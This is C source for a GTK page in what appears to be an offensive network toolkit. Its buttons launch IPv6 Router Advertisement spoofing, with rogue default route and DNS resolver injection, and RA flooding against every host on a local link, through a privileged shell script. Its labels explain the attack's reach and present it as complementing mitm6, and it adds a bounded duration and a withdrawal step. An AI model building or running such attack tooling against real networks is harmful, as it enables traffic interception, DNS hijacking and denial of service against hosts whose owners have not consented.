/* Router Advertisement / SLAAC page for module 32_resolver_poison.
   Registered as a second submenu entry beside the existing page. */
#define RP_RA_SCRIPT wf_path("modules/32_resolver_poison.sh")

typedef struct {
    AppState    *state;
    GtkWidget   *iface;
    GtkWidget   *prefix;
    GtkWidget   *dns;
    GtkWidget   *view;
    GSubprocess *proc;
} RpRaPage;

static void rp_ra_fin(GObject *src, GAsyncResult *res, gpointer ud)
{
    RpRaPage *p = ud;
    g_autoptr(GError) e = NULL;
    g_autofree char *o = NULL, *r = NULL;
    gboolean ok = g_subprocess_communicate_utf8_finish(G_SUBPROCESS(src), res, &o, &r, &e);
    g_clear_object(&p->proc);
    if (o && *o)             wf_output_set(p->view, o);
    else if (!ok && r && *r) wf_output_set(p->view, r);
    else                     wf_output_set(p->view, "(no output)");
}

static void rp_ra_run(GtkButton *b, gpointer ud)
{
    RpRaPage *p = ud;
    g_autoptr(GError) e = NULL;
    const char *verb = g_object_get_data(G_OBJECT(b), "rp-ra-verb");
    const char *iface = gtk_editable_get_text(GTK_EDITABLE(p->iface));
    const char *prefix = gtk_editable_get_text(GTK_EDITABLE(p->prefix));
    const char *dns = gtk_editable_get_text(GTK_EDITABLE(p->dns));
    const char *argv[16];
    int n = 0;

    if (verb == NULL || p->proc != NULL) return;

    if (g_strcmp0(verb, "--ra-spoof") == 0) {
        gboolean low = GPOINTER_TO_INT(
            g_object_get_data(G_OBJECT(b), "rp-ra-low")) != 0;
        if (iface == NULL || *iface == '\0' ||
            prefix == NULL || *prefix == '\0') {
            show_toast_module(p->state, "32_resolver_poison",
                "Interface and prefix are both required", "warn");
            return;
        }
        argv[n++] = "pkexec"; argv[n++] = RP_RA_SCRIPT;
        argv[n++] = "--ra-spoof"; argv[n++] = iface;
        argv[n++] = "--prefix";   argv[n++] = prefix;
        if (dns != NULL && *dns != '\0') {
            argv[n++] = "--dns"; argv[n++] = dns;
        }
        /* 1800s and high preference unless the Low button was used.
           A bounded duration means the attack withdraws itself rather
           than leaving clients pointed at a host that is not routing. */
        argv[n++] = "--lifetime"; argv[n++] = "1800";
        argv[n++] = "--duration"; argv[n++] = "300";
        if (low) argv[n++] = "--low";
        argv[n] = NULL;
    } else if (g_strcmp0(verb, "--ra-flood") == 0) {
        if (iface == NULL || *iface == '\0') {
            show_toast_module(p->state, "32_resolver_poison",
                "Enter an interface first", "warn");
            return;
        }
        argv[n++] = "pkexec"; argv[n++] = RP_RA_SCRIPT;
        argv[n++] = "--ra-flood"; argv[n++] = iface;
        argv[n] = NULL;
    } else if (g_strcmp0(verb, "--ra-linklocal") == 0) {
        if (iface == NULL || *iface == '\0') {
            show_toast_module(p->state, "32_resolver_poison",
                "Enter an interface to derive from", "warn");
            return;
        }
        argv[n++] = RP_RA_SCRIPT;
        argv[n++] = "--ra-linklocal";
        /* The verb wants a MAC; read it from the interface at call time
           using the shell, which is the only place that knows it. */
        argv[n++] = "--from-iface"; argv[n++] = iface;
        argv[n] = NULL;
    } else {
        argv[n++] = "pkexec"; argv[n++] = RP_RA_SCRIPT;
        argv[n++] = verb; argv[n] = NULL;
    }

    p->proc = g_subprocess_newv(argv,
        G_SUBPROCESS_FLAGS_STDOUT_PIPE | G_SUBPROCESS_FLAGS_STDERR_PIPE, &e);
    if (p->proc == NULL) {
        show_toast_module(p->state, "32_resolver_poison",
            e ? e->message : "could not start", "error");
        return;
    }
    wf_output_set(p->view, "working…");
    g_subprocess_communicate_utf8_async(p->proc, NULL, NULL, rp_ra_fin, p);
}

static GtkWidget *rp_ra_build(AppState *state, gpointer md)
{
    RpRaPage *p = g_new0(RpRaPage, 1);
    GtkWidget *page = gtk_box_new(GTK_ORIENTATION_VERTICAL, 10);
    GtkWidget *title = gtk_label_new("RA / SLAAC");
    GtkWidget *sub = gtk_label_new(
        "Announce yourself as the IPv6 router. SLAAC is unauthenticated, so "
        "every host on the link accepts this: new default route, new prefix, "
        "and via RDNSS a new resolver. No ARP, no DHCP, no association.");
    GtkWidget *warn = gtk_label_new(
        "This reconfigures every host on the segment, and an RA left running "
        "strands them with a route to a host that is not routing. Use a "
        "bounded duration, and Stop sends a withdrawal so they drop it "
        "deliberately rather than ageing it out over half an hour.");
    GtkWidget *card = gtk_box_new(GTK_ORIENTATION_VERTICAL, 8);
    GtkWidget *ct = gtk_label_new("ROUTER ADVERTISEMENT");
    GtkWidget *r1 = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 8);
    GtkWidget *r2 = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 8);
    GtkWidget *r3 = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 8);
    GtkWidget *l_i = gtk_label_new("Interface:");
    GtkWidget *iface = gtk_entry_new();
    GtkWidget *l_p = gtk_label_new("Prefix:");
    GtkWidget *prefix = gtk_entry_new();
    GtkWidget *l_d = gtk_label_new("DNS:");
    GtkWidget *dns = gtk_entry_new();
    GtkWidget *b_hi = gtk_button_new_with_label("RA spoof");
    GtkWidget *b_lo = gtk_button_new_with_label("RA spoof (low pref)");
    GtkWidget *b_fl = gtk_button_new_with_label("RA flood");
    GtkWidget *b_ll = gtk_button_new_with_label("EUI-64");
    GtkWidget *b_st = gtk_button_new_with_label("Stop and withdraw");
    GtkWidget *note = gtk_label_new(
        "Fills the gap mitm6 leaves. mitm6 does DHCPv6 and deliberately does "
        "not do Router Advertisements, so a network without DHCPv6 in play "
        "is untouched by it and open to this. The two attack different halves "
        "of IPv6 autoconfiguration.");
    GtkWidget *scroll = fp_text_view();

    (void) md;
    gtk_widget_add_css_class(page, "dependency-page");
    gtk_widget_add_css_class(title, "page-title");
    gtk_widget_add_css_class(sub, "page-subtitle");
    gtk_widget_add_css_class(warn, "dependency-summary");
    gtk_widget_add_css_class(card, "section-card");
    gtk_widget_add_css_class(ct, "section-title");
    gtk_widget_add_css_class(note, "dependency-summary");
    gtk_label_set_xalign(GTK_LABEL(title), 0.0f);
    gtk_label_set_xalign(GTK_LABEL(sub), 0.0f);
    gtk_label_set_xalign(GTK_LABEL(warn), 0.0f);
    gtk_label_set_xalign(GTK_LABEL(ct), 0.0f);
    gtk_label_set_xalign(GTK_LABEL(note), 0.0f);
    gtk_label_set_wrap(GTK_LABEL(sub), TRUE);
    gtk_label_set_wrap(GTK_LABEL(warn), TRUE);
    gtk_label_set_wrap(GTK_LABEL(note), TRUE);
    gtk_widget_set_hexpand(iface, TRUE);
    gtk_widget_set_hexpand(prefix, TRUE);
    gtk_widget_set_hexpand(dns, TRUE);
    gtk_entry_set_placeholder_text(GTK_ENTRY(iface), "wlan0");
    gtk_entry_set_placeholder_text(GTK_ENTRY(prefix), "fd00:dead:beef::");
    gtk_entry_set_placeholder_text(GTK_ENTRY(dns), "fd00:dead:beef::1 (optional)");
    gtk_widget_set_size_request(scroll, -1, 240);

    p->state = state; p->iface = iface; p->prefix = prefix; p->dns = dns;
    p->view = gtk_scrolled_window_get_child(GTK_SCROLLED_WINDOW(scroll));

    {
        struct { GtkWidget *b; const char *v; int low; } a[] = {
            { b_hi, "--ra-spoof",     0 },
            { b_lo, "--ra-spoof",     1 },
            { b_fl, "--ra-flood",     0 },
            { b_ll, "--ra-linklocal", 0 },
            { b_st, "--ra-stop",      0 },
        };
        for (guint i = 0; i < G_N_ELEMENTS(a); i++) {
            g_object_set_data(G_OBJECT(a[i].b), "rp-ra-verb", (gpointer) a[i].v);
            g_object_set_data(G_OBJECT(a[i].b), "rp-ra-low",
                              GINT_TO_POINTER(a[i].low));
            g_signal_connect(a[i].b, "clicked", G_CALLBACK(rp_ra_run), p);
        }
    }

    gtk_box_append(GTK_BOX(r1), l_i);
    gtk_box_append(GTK_BOX(r1), iface);
    gtk_box_append(GTK_BOX(r1), l_p);
    gtk_box_append(GTK_BOX(r1), prefix);
    gtk_box_append(GTK_BOX(r2), l_d);
    gtk_box_append(GTK_BOX(r2), dns);
    gtk_box_append(GTK_BOX(r3), b_hi);
    gtk_box_append(GTK_BOX(r3), b_lo);
    gtk_box_append(GTK_BOX(r3), b_fl);
    gtk_box_append(GTK_BOX(r3), b_ll);
    gtk_box_append(GTK_BOX(r3), b_st);
    gtk_box_append(GTK_BOX(card), ct);
    gtk_box_append(GTK_BOX(card), r1);
    gtk_box_append(GTK_BOX(card), r2);
    gtk_box_append(GTK_BOX(card), r3);
    gtk_box_append(GTK_BOX(card), note);
    gtk_box_append(GTK_BOX(page), title);
    gtk_box_append(GTK_BOX(page), sub);
    gtk_box_append(GTK_BOX(page), warn);
    gtk_box_append(GTK_BOX(page), card);
    gtk_box_append(GTK_BOX(page), scroll);
    return page;
}
